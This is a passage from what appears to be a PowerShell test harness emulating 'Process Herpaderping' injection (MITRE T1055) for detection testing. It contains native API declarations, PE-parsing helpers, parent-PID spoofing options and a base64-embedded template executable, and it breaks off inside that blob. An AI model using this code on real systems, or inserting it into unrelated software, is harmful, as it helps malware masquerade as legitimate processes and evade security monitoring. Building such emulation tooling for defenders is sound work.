# Implementation based on Johnny Shaw's original PoC: https://github.com/jxy-s/herpaderping. Thanks, Johnny!

if (-not ('AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods' -as [Type])) {
    $TypeDef = @'
using System;
using System.Runtime.InteropServices;

namespace AtomicTestHarnesses_T1055_UNK {
    public struct LARGE_INTEGER
	{
		public uint LowPart;
		public int  HighPart;
	}

    public struct PROCESS_BASIC_INFORMATION
	{
		public IntPtr  ExitStatus;
		public IntPtr  PebBaseAddress;
		public IntPtr  AffinityMask;
		public IntPtr  BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr  InheritedFromUniqueProcessId;
	}

    public struct UNICODE_STRING
	{
		public short  Length;
		public short  MaximumLength;
		public IntPtr Buffer;
	}

    public class ProcessNativeMethods {
        [DllImport("advapi32.dll", SetLastError = true)]
		public static extern int LsaNtStatusToWinError(int status);

        [DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetProcessId(IntPtr Process);

        [DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetThreadId(IntPtr Thread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            int processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			uint dwSize,
			int flAllocationType,
			int flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool ReadProcessMemory( 
			IntPtr hProcess, 
			IntPtr lpBaseAddress,
			ref IntPtr lpBuffer,
			UInt32 dwSize, 
			ref UInt32 lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 nSize,
			ref UInt32 lpNumberOfBytesWritten);

        [DllImport("ntdll.dll")]
		public static extern IntPtr NtCurrentProcess();

        [DllImport("ntdll.dll")]
		public static extern int NtCreateSection(
			ref IntPtr SectionHandle,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			ref LARGE_INTEGER MaximumSize,
			UInt32 SectionPageProtection,
			UInt32 AllocationAttributes,
			IntPtr FileHandle);

        [DllImport("ntdll.dll")]
		public static extern int NtCreateProcessEx(
			ref IntPtr ProcessHandle,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr ParentProcess,
			uint Flags,
			IntPtr SectionHandle,
			IntPtr DebugPort,
			IntPtr ExceptionPort,
			bool InJob);

        [DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr ProcessHandle, 
			UInt32 ProcessInformationClass,
			ref PROCESS_BASIC_INFORMATION ProcessInformation,
			UInt32 ProcessInformationLength,
			ref UInt32 ReturnLength);

        [DllImport("ntdll.dll")]
		public static extern int RtlCreateProcessParametersEx(
			ref IntPtr pProcessParameters,
			ref UNICODE_STRING ImagePathName,
			IntPtr DllPath,
			IntPtr CurrentDirectory,
			ref UNICODE_STRING CommandLine,
			IntPtr Environment,
			ref UNICODE_STRING WindowTitle,
			ref UNICODE_STRING DesktopInfo,
			IntPtr ShellInfo,
			IntPtr RuntimeData,
			UInt32 Flags);

        [DllImport("ntdll.dll")]
		public static extern int NtCreateThreadEx(
			ref IntPtr hThread,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr ProcessHandle,
			IntPtr lpStartAddress,
			IntPtr lpParameter,
			bool CreateSuspended,
			UInt32 StackZeroBits,
			UInt32 SizeOfStackCommit,
			UInt32 SizeOfStackReserve,
			IntPtr lpBytesBuffer);

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
		public static extern void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            String SourceString);

        [DllImport("ntdll.dll")]
		public static extern IntPtr RtlGetCurrentPeb();

        [DllImport("ntdll.dll")]
		public static extern int NtClose(
			IntPtr Handle);
    }
}
'@

    Add-Type -TypeDefinition $TypeDef
}

# Helper function. Do not export.
function Get-NtStatusMessage {
    param (
        [Parameter(Mandatory, Position = 0)]
        [Int]
        $NTStatus
    )

    # Used to obtain the human-readable error messages for ntdll function calls.
    $GetMessage = [Byte].Assembly.GetType('Microsoft.Win32.Win32Native').GetMethod('GetMessage', 'NonPublic, Static', $null, [Type[]] @([Int]), $null)

    $WinError = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::LsaNtStatusToWinError($NTStatus)
    $ErrorMessage = $GetMessage.Invoke($null, @($WinError)).TrimEnd()

    return $ErrorMessage
}

# Helper function. Do not export.
function New-UnicodeString {
    param (
        [Parameter(Mandatory, Position = 0)]
        [ValidateNotNull()]
        $String
    )

    $UnicodeString = New-Object -TypeName AtomicTestHarnesses_T1055_UNK.UNICODE_STRING

    [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::RtlInitUnicodeString([Ref] $UnicodeString, $String)

    return $UnicodeString
}

# Helper function. Do not export.
function Get-ProcessEnvironmentBlockAddress {
        param (
            [Parameter(Mandatory, Position = 0)]
            [IntPtr]
            $ProcessHandle
        )

        $ProcessBasicInformation = New-Object -TypeName AtomicTestHarnesses_T1055_UNK.PROCESS_BASIC_INFORMATION
        $PBISize = [Runtime.InteropServices.Marshal]::SizeOf([Type][AtomicTestHarnesses_T1055_UNK.PROCESS_BASIC_INFORMATION])
        [UInt32] $ReturnLength = 0

        $Result = [AtomicTestHarnesses_T1055_UNK.ProcessNativeMethods]::NtQueryInformationProcess(
            $ProcessHandle,
            0, # ProcessBasicInformation
            [Ref] $ProcessBasicInformation,
            $PBISize,
            [Ref] $ReturnLength
        )

        if ($Result -eq 0) {
            return ($ProcessBasicInformation.PebBaseAddress)
        }
    }

# Helper function. Do not export.
function Get-ExecutableMachineAndEntrypointRVA {
        param (
            [Parameter(Mandatory)]
            [Byte[]]
            $ExeBytes
        )

        $MemoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList @(,$ExeBytes)
        $BinaryReader = New-Object -TypeName IO.BinaryReader -ArgumentList $MemoryStream

        $E_MAGIC = $BinaryReader.ReadBytes(2)

        if ([Text.Encoding]::ASCII.GetString($E_Magic) -cne 'MZ') {
            Write-Error "Executable is not a valid portable executable (PE). Expected `"MZ`" magic signature."
            return
        }

        # Seek to e_lfanew offset
        $null = $MemoryStream.Seek(0x3C, 'Begin')

        $E_LFANEW = $BinaryReader.ReadInt32()

        # Seek to NT headers
        $null = $MemoryStream.Seek($E_LFANEW, 'Begin')

        $PESignature = $BinaryReader.ReadBytes(4)

        if ([Text.Encoding]::ASCII.GetString($PESignature[0..1]) -cne 'PE') {
            Write-Error "Source executable is not a valid portable executable (PE). Expected `"PE`" magic signature."
            return
        }

        $Machine = $BinaryReader.ReadUInt16()
        $AddressOfEntryPointOffset = $E_LFANEW + 0x28

        $null = $MemoryStream.Seek($AddressOfEntryPointOffset, 'Begin')

        $AddressOfEntryPoint = $BinaryReader.ReadUInt32()

        $BinaryReader.Close()
        $MemoryStream.Close()

        [PSCustomObject] @{
            Machine = $Machine
            AddressOfEntryPoint = $AddressOfEntryPoint
        }
    }

function Start-ATHProcessHerpaderp {
<#
.SYNOPSIS

Test runner for "Process Herpaderping" process injection.

Technique ID: T1055 (Process Injection)

.DESCRIPTION

Start-ATHProcessHerpaderp starts a process masquerading as a legitimate process using the "Process Herpaderping" (https://jxy-s.github.io/herpaderping/) technique.

Start-ATHProcessHerpaderp is designed to only work with 64-bit processes.

.PARAMETER TargetFilePath

Specifies the filename or full file path of the process that will be written to and executed. This serves as the process that will execute the contents of the source file while masquerading as the specified target process.

.PARAMETER SourceFilePath

Specifies the path to the executable to be executed.

.PARAMETER SourceFileBytes

Specifies the the executable to be executed as a byte array. This is offered as an alternative to -SourceFilePath to demonstrate that the source file need not be present on disk.

.PARAMETER ReplacementFilePath

Specifies the path to the executable that you want the OS to think is running.

.PARAMETER ReplacementFileBytes

Specifies the executable that you want the OS to think is running as a byte array. This is offered as an alternative to -ReplacementFilePath to demonstrate that the target file need not be present on disk.

.PARAMETER ParentId

Specifies the process ID of the process under which a process will be spawned.

Note: Specifying an alternate process is not related to this injection technique but it is supported as an option considering the underlying APIs involved (RtlCreateProcessParametersEx) allow a developer to supply a handle to another process. Specifying another process to spawn from is related to T1134.004 (Access Token Manipulation: Parent PID Spoofing).

.PARAMETER CommandLine

Specifies the command-line of the process to be started. If -CommandLine is not specified, the target file path is used as the command-line.

Note: Specifying the command-line of a process is not related to this injection technique but it is supported as an option considering the underlying APIs involved (RtlCreateProcessParametersEx) allow a developer to supply a custom command-line string.

.PARAMETER TestGuid

Optionally, specify a test GUID value to use to override the generated test GUID behavior.

.INPUTS

System.Diagnostics.Process

Start-ATHProcessHerpaderp accepts the output of Get-Process. Only one Process object should be supplied to Start-ATHProcessHerpaderp.

Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process

Start-ATHProcessHerpaderp accepts the output of a Win32_Process WMI object via Get-CimInstance.

.OUTPUTS

PSObject

Outputs an object consisting of relevant execution details. The following object properties may be populated:

* TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
* TestSuccess - Will be set to True if it was determined that the technique executed successfully. Start-ATHProcessHerpaderp can only confidently determine success when neither -SourceFilePath nor -SourceFileBytes are supplied. In this scenario, a template exectuable that spawns a specific instance of powershell.exe is used to validate successful execution.
* TestGuid - Specifies the test GUID that was used for the test.
* ExecutionType - Indicates if the source/target files were supplied on disk or as a byte array. Supported output: File, Memory
* SourceExecutableFilePath - Specifies the full path of the source executable. If the source executable is specified as a byte array, this property will be empty.
* SourceExecutableFileHash - SHA256 hash of the source executable.
* ReplacementExecutableFilePath - Specifies the full path of the replacement executable. If the replacement executable is specified as a byte array, this property will be empty.
* ReplacementExecutableFileHash - SHA256 hash of the replacement executable.
* TargetExecutablePath - Specifies the full path of the target executable.
* ProcessId - Specifies the process ID of the target ("injected") process.
* ProcessPath - Specifies the full path of the target executable. This should match TargetExecutablePath.
* ProcessCommandLine - Specifies the command-line of the target process. This will consist of the target executable path by default or the value specified with the -CommandLine parameter.
* ProcessModule - Specifies loaded target process module information: ModuleName, FileName, BaseAddress, ModuleMemorySize, EntryPointAddress
* ProcessMainThread - Specifies information about the main thread of the target process: Id, StartAddress
* ParentProcessId - Process ID of the process that the target process spawned from.
* ParentProcessPath - Executable path of the process that the target process spawned from.
* ParentProcessCommandLine - Command-line of the process that the child process spawned from.
* ChildProcessId - Specifies the process ID of process that was executed as the result of the target process executing.
* ChildProcessCommandLine - Specifies the command-line of process that was executed as the result of the target process executing.

.EXAMPLE

Start-ATHProcessHerpaderp

.EXAMPLE

Get-Process -Name explorer | Start-ATHProcessHerpaderp

Perform "Process Herpadering" injection specifying the running explorer.exe process as the parent process.

.EXAMPLE

Start-ATHProcessHerpaderp -TargetFilePath foo.exe -SourceFilePath 'C:\Program Files\7-Zip\7zG.exe' -ReplacementFilePath 'C:\Windows\System32\SnippingTool.exe'

Perform "Process Herpadering" injection by specifying source and replacement files on disk.

.EXAMPLE

$SourceFileBytes = [IO.File]::ReadAllBytes('C:\Program Files\7-Zip\7zG.exe')
$ReplacementFileBytes = [IO.File]::ReadAllBytes('C:\Windows\System32\SnippingTool.exe')
Start-ATHProcessHerpaderp -SourceFileBytes $SourceFileBytes -ReplacementFileBytes $ReplacementFileBytes

Emulates source and replacement files in memory.

.EXAMPLE

Start-ATHProcessHerpaderp -CommandLine 'fake cmdline'

Perform "Process Herpadering" injection and specifying a user-supplied command-line.
#>

    [CmdletBinding(DefaultParameterSetName = 'File')]
    param (
        [Parameter(ParameterSetName = 'File')]
        [Parameter(ParameterSetName = 'SourceAndReplacementBytes')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TargetFilePath = 'target.exe',

        [Parameter(ParameterSetName = 'File')]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFilePath,

        [Parameter(Mandatory, ParameterSetName = 'SourceAndReplacementBytes')]
        [Byte[]]
        $SourceFileBytes,

        [Parameter(ParameterSetName = 'File')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ReplacementFilePath = "$Env:windir\System32\SnippingTool.exe",

        [Parameter(Mandatory, ParameterSetName = 'SourceAndReplacementBytes')]
        [Byte[]]
        $ReplacementFileBytes,

        [Parameter(ValueFromPipelineByPropertyName)]
        [Int]
        [Alias('Id')] # Supports pipelining with Get-Process
        [Alias('ProcessId')] # Supports pipelining with Get-CimInstance Win32_Process
        $ParentId,

        [ValidateNotNull()]
        $CommandLine,

        [Guid]
        $TestGuid = (New-Guid)
    )

    if ([IntPtr]::Size -eq 4) {
        Write-Error 'Start-ATHProcessHerpaderp is not supported in 32-bit PowerShell.'
    }

    $ShareMode = [IO.FileShare] 'Delete, ReadWrite'

    # Template executable that spawns powershell.exe when neither -SourceFilePath nor -SourceFileBytes are supplied.
    # SHA256 Hash: 40EF383E33B1A2CEB8A6E2E8D12A81D413DE10533ED306F9CFAE6CFAA8544218
    # VirusTotal Analysis: https://www.virustotal.com/gui/file/40ef383e33b1a2ceb8a6e2e8d12a81d413de10533ed306f9cfae6cfaa8544218/detection
    <# C code used to generate the template executable below:
        #include <windows.h>

        int main(int argc, char* argv[], char* envp[])
        {
	        UNREFERENCED_PARAMETER(argc);
	        UNREFERENCED_PARAMETER(argv);
	        UNREFERENCED_PARAMETER(envp);

	        PROCESS_INFORMATION processInformation;
	        STARTUPINFO startupInfo;
	        BOOL creationResult;

	        ZeroMemory(&processInformation, sizeof(processInformation));
	        ZeroMemory(&startupInfo, sizeof(startupInfo));
	        startupInfo.cb = sizeof(startupInfo);

	        creationResult = CreateProcess(
		        NULL,
		        L"powershell.exe -nop -Command Write-Host AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA; Start-Sleep -Seconds 2; exit",
		        NULL,
		        NULL,
		        FALSE,
		        CREATE_NO_WINDOW,
		        NULL,
		        NULL,
		        &startupInfo,
		        &processInformation);

	        return 0;
        }
    #>
    $TemplateSourceBytes = [Convert]::FromBase64String('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